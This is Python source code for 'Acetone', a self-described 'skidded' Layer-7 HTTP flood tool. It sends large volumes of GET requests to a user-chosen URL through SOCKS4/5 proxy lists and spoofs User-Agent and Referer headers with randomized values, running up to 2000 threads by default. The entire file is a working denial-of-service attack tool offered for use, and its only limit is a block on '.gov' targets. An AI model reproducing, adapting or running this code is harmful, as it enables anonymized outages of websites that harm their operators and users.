import os, datetime, socks, ssl, time, requests, json
import threading
from random import choice as Choice, randint as Intn
from colorama import Fore as f, init

init(convert = True)
banner = f"""{f.RED}
╔═╗┌─┐┌─┐┌┬┐┌─┐┌┐┌┌─┐
╠═╣│  ├┤  │ │ ││││├┤ 
╩ ╩└─┘└─┘ ┴ └─┘┘└┘└─┘ (CH3)2CO L7-HTTP Method | Skidded by khoi1908vn
{f.RESET}"""
class quotes:
    PleaseEnterTheCorrectOption = '[!] Please enter the correct option'
    socks4FilePath = '[?] SOCKS4 Proxies file path [default = socks4.txt]: '
    socks5FilePath = '[?] SOCKS5 Proxies file path [default = socks5.txt]: '
    NoProxyDetected = '[!] No proxy detected! Please get a new one ...'
    AvailableProxies = '[~] Available proxies: '
    TargetURL = '[?] Target URL (include https:// or http://): '
    CantAttackGOV = "[!] You can't attack .gov websites!"
    AskCookies = '[?] Cookies? [y/n][default = n]: '
    EnterCookies = '[?] Please enter your cookies (RAW format): '
    AskSOCKSType = '[?] Socks mode? [4/5][default = 5]: '
    AskThreads = '[?] Threads? [default = 2000]: '
    PleaseEnterANumber = '[!] Please enter a number!'
    DonePleaseReview = '[~] Done. Press enter to review the settings'
    AttackInfo = "[+] Attack information: "
    CheckingInternet = "[~] Checking Internet Connection..."
    AskTime = "[+] Attack time? (in seconds, 0 for manual stop) [default = 0]: "

    
line_break = '\r\n'
class make_resources:
    acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept-Encoding: gzip, deflate\r\n",
        "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5\r\n",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ]
    referers = [
        "https://www.google.com/search?q=",
        "https://check-host.net/",
        "https://www.facebook.com/",
        "https://www.youtube.com/",
        "https://www.fbi.com/",
        "https://www.bing.com/search?q=",
        "https://r.search.yahoo.com/",
        "https://www.cia.gov/index.html",
        "https://vk.com/profile.php?redirect=",
        "https://www.usatoday.com/search/results?q=",
        "https://help.baidu.com/searchResult?keywords=",
        "https://steamcommunity.com/market/search?q=",
        "https://www.ted.com/search?q=",
        "https://play.google.com/store/search?q=",
        "https://www.qwant.com/search?q=",
        "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
        "https://www.google.ad/search?q=",
        "https://www.google.ae/search?q=",
        "https://www.google.com.af/search?q=",
        "https://www.google.com.ag/search?q=",
        "https://www.google.com.ai/search?q=",
        "https://www.google.al/search?q=",
        "https://www.google.am/search?q=",
        "https://www.google.co.ao/search?q=",
    ]

def closeProgram(reason: str = '\n[~] Exiting... Press Enter to close the window...'):
    print(reason)
    input()
    exit()

def ParseUrl(url_to_parse: str):
    url = url_to_parse[8:] if url_to_parse[:8] == 'https://' else url_to_parse[7:]
    protocol = 'https' if url_to_parse[:8] == 'https://' else 'http'
    web = url.split('/')[0]
    checkport = web.split(':')
    port = int(checkport[1]) if len(checkport) != 1 else 443 if protocol == 'https' else 80
    target = checkport[0]
    path = url.replace(web, '', 1) if len(url.split('/')) > 1 else '/'
    return target, path, port, protocol

def ask(question: str, options: list, default):
    ans = ''
    while ans == '':
        ans = str(input(question)).strip().lower()
        if ans == '': ans = default
        elif ans not in options: ans = ''; print(quotes.PleaseEnterTheCorrectOption); continue
        return ans

def fix_proxy_list(file_path: str): # check and fix the proxy file.
    print('Checking socks file...')
    templist = []
    with open(file_path) as f:
        for line in f.readlines(): 
            if line not in templist and ':' in line: templist.append(line)
    with open(file_path, 'wb') as f:
        for line in templist:
            f.write(bytes(line, encoding = 'utf-8'))        

def ProxiesOptions(proxy_type: int):
    out_file = str(input(quotes.socks4FilePath if proxy_type == 4 else quotes.socks5FilePath))
    out_file = out_file if out_file != '' else 'socks4.txt' if proxy_type == 4 else 'socks5.txt'
    fix_proxy_list(out_file)
    try:
        with open(out_file) as f:
            proxies = f.readlines()
    except FileNotFoundError: closeProgram(f"File {out_file} not found!")
    proxiescount = len(proxies)
    if proxiescount == 0: closeProgram(quotes.NoProxyDetected)
    # print(f'Available proxies: {proxiescount} SOCKS{str(proxy_type)}')
    print(quotes.AvailableProxies + str(proxiescount) + ' ' + f'SOCKS{proxy_type}')
    return proxies

def signature(lines = '------------------------------------------------------------------------------------------------------------------------', quote = 'A fully-skidded L7-HTTP SOCKS attack script written in Python 3 using PySocks <import socks | pip install PySocks>'):
    print(f.LIGHTRED_EX + lines)
    print(banner)
    print(f.LIGHTRED_EX + lines)
    print(quote)
    print(f.LIGHTRED_EX + lines)
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
        command = 'cls'
    os.system(command)
    signature()


def gen_user_agent():
	platform = Choice(['Macintosh', 'Windows', 'X11']) #radom
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def make_header(target, path, cookies = ''):
    connection = "Connection: Keep-Alive" + line_break
    if cookies != '': connection += f"Cookies: {str(cookies)}" + line_break
    accept = Choice(make_resources.acceptall)
    referer = Choice(make_resources.referers)
    referer = f"Referer: {referer}" + target + path + line_break
    useragent = "User-Agent: " + gen_user_agent() + line_break
    return referer + useragent + accept + connection + line_break


def make_random_url(strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"):
    result = ''
    for _ in range(2):
        for _ in range(2):
            result += Choice(strings) + str(Intn(0, 271400281257))
        result += Choice(strings)
    return result


def attack_thread(event: threading.Event, socks_type: int, target: str, port: int, protocol: str, multiple: int, path: str, proxies: list, cookies: str):
    header = make_header(target = target, path = path, cookies= cookies)
    proxy = Choice(proxies).strip().split(':')
    add = '&' if '?' in path else '?'
    socksType = socks.SOCKS5 if socks_type == 5 else socks.SOCKS4
    proxy_ip = str(proxy[0])
    proxy_port = int(proxy[1])
    # print('Thread created')
    event.wait()
    while event.is_set():
        try:
            # print('Thread starting doing shit ig')
            s = socks.socksocket()
            s.set_proxy(socksType, proxy_ip, proxy_port)
            s.connect((target, port))
            test_allowed = True
            if protocol == 'https' and test_allowed:
                s = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT).wrap_socket(s, server_hostname= target)
            try:
                for _ in range(multiple + 1):
                    get_host = "GET " + path + add + make_random_url() + ' HTTP/1.1' + line_break + 'Host: ' + target + line_break
                    request = get_host + header
                    s.send(str.encode(request))
                s.close()
            except: s.close()
        except: s.close()

class attack_quotes:
    PressEnterToStart = '[?] Press enter to start...\n'
    StartingInWaiting = '[>] Starting threads in waiting mode...'
    WakingUp = '[>] Waking up threads...'
    Started = '[>] Started the attack! Press Ctrl + C (SIG.TERM) anytime to stop the attack.'
    MightLag = '[*] WARNING: This might slow down your internet connection so you might experience lags even in dstats'
    FinishedIn = '[~] Finished attack in'
    Stopping = '[~] Stopping...'
    FalsingEvent = '[~] Setting internal flag to False...'
    TryingToClose = '[~] Set! Trying to close the program...'

def attack(socks_type: int, target: str, port: int, protocol: str, path: str, cookies: str, proxies: list, thread_num: int, multiple: int = 100, attack_time: float = 120.0, atq: type = attack_quotes, event: threading.Event = threading.Event()):
    """
    This module is for attacking outside the script, 
    you will need to manually split your url into protocol + target + path + port | ParseUrl(), e.g -> 'http' + 'example.com' + '/' + '80'
    get your proxies into a list/array | ProxiesOption(). 
    """
    proxiescount = len(proxies)
    if __name__ != '__main__': print('Importing Acetone...'); signature()
    event.clear()
    process_list = []
    for _ in range(thread_num):
        th = threading.Thread(target = attack_thread, args = (event, socks_type, target, port, protocol, multiple, path, proxies, cookies), daemon = True)
        process_list.append(th)
    input(atq.PressEnterToStart)
    # press enter to start
    print(atq.StartingInWaiting)
    for i in process_list:
        i.start() # make the thread wait
    print(atq.WakingUp)
    event.set() # start all threads
    print(atq.Started)
    print(atq.MightLag, end = '\n\n')
    start = time.time()
    while event.is_set() and (attack_time == 0 or time.time() - start <= attack_time):
        try:
            el = time.time() - start 
            el = 1 if el == 0 else el
            print(f'[~] Attacking {str(target)}:{str(port)} ({str(thread_num)}thrs {str(proxiescount)}prxs) | {round(el)}/{str(attack_time if attack_time != 0 else "inf")}s elapsed' + ('| Attack powered by your lovely CPU and Acetone' if __name__ != '__main__' else ''), end = '\r')
            time.sleep(0.05)
        except KeyboardInterrupt:
            break
    else: # this only happen when time is up, in inf mode the 'break' will not execute this (python while break else rule)
        print(atq.FinishedIn + f'{str(attack_time)}s')
    print(atq.Stopping, end= '                                                                      \n')
    print(atq.FalsingEvent)
    event.clear()
    print(atq.TryingToClose)
    



def main():
    # input
    url = ''
    while url == '':
        url = str(input(quotes.TargetURL)).strip()
        if all(i not in url for i in ['http://', 'https://']):
            url = ''
        if '.gov' in url:
            url = ''
            print(quotes.CantAttackGOV)
    target, path, port, protocol = ParseUrl(url)
    need_cookies = ask(question=quotes.AskCookies, default='n', options=['y', 'n'])
    need_cookies = True if need_cookies == 'y' else False
    cookies = str(input(quotes.EnterCookies)).strip() if need_cookies else ''
    socks_type = ask(question=quotes.AskSOCKSType, options=['4','5'], default='5')
    socks_type = 4 if socks_type == '4' else 5
    thread_num = None
    while thread_num == None:
        try:
            thread_num = str(input(quotes.AskThreads)).strip()
            thread_num = 2000 if thread_num in ['0', ''] else int(thread_num)
        except ValueError: print(quotes.PleaseEnterANumber)
    proxies = ProxiesOptions(socks_type)
    attack_time = None
    while attack_time == None:
        try:
            attack_time = str(input(quotes.AskTime)).strip()
            attack_time = 0 if attack_time in ['0', ''] else int(attack_time)
        except ValueError:
            print(quotes.PleaseEnterANumber)
    input(quotes.DonePleaseReview)

    # press enter to continue
    clearConsole()
    print(quotes.AttackInfo + line_break + f'- Target: {target}' + line_break + f'- Threads: {thread_num}' + line_break + f'- Proxies {str(len(proxies))} SOCKS{socks_type}' + line_break + f'- Time: {str(attack_time if attack_time != 0 else "<inf>")}s')
    print('\n')
    # attack(socks_type: int, target: str, port: int, protocol: str, path: str, cookies: str, proxies: list, thread_num: int, multiple: int = 100, attack_time: float = 120.0, atq: type = attack_quotes, event: threading.Event = threading.Event()):
    attack(socks_type= socks_type, target= target, port= port, protocol= protocol, path= path, cookies= cookies, proxies= proxies, thread_num= thread_num, attack_time= attack_time)
    closeProgram()
    # for fun, this shit is unreachable
    for i in process_list:
        i.join()
    print('[~] Stopped')
if __name__ == '__main__':
    signature()
    print(quotes.CheckingInternet)
    try:
        r = str(requests.get('https://myexternalip.com/raw', timeout = 7).text)
    except requests.RequestException:
        test_allowed = False
        if test_allowed:
            print('[!] Something wrong with your connection! Checking with a aternative server...')
            try:
                r = requests.get('https://ipinfo.io/', timeout = 7).json()['ip']
            except Exception as e:
                print(f'[!] Something wrong with your connection! error {e}')
                input('Press Enter to exit...')
                closeProgram()
            else:
                print('Done! Your IP address is: ' + r)
        else:
            print('[!] Your internet connection, too slow or... you dont have.')
            input('Press Enter to exit...')
            closeProgram()
    else:
        print('Done! Your IP address is: ' + r)
    main()